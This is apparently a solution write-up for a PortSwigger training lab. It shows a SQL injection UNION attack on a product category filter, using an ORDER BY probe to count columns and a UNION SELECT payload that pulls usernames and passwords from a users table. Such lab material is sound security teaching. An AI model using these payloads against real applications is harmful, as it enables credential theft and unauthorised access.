# SQL injection UNION attack, retrieving data from other tables

**Lab Url**: [https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

## Objective

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

## Solution

First, determine the number of columns, then retrieve the credentials from the `users` table using a `UNION SELECT` attack.

### Step 1: Determine the column count

```bash
/filter?category=Gifts' ORDER BY 2--
```

The query returns **two columns**.

### Step 2: Retrieve credentials

The lab description confirms a `users` table with `username` and `password` columns. Extract all credentials:

```bash
/filter?category=Gifts' UNION SELECT username, password FROM users--
```

The response displays the usernames and passwords. Log in as `administrator` with the retrieved password to solve the lab.
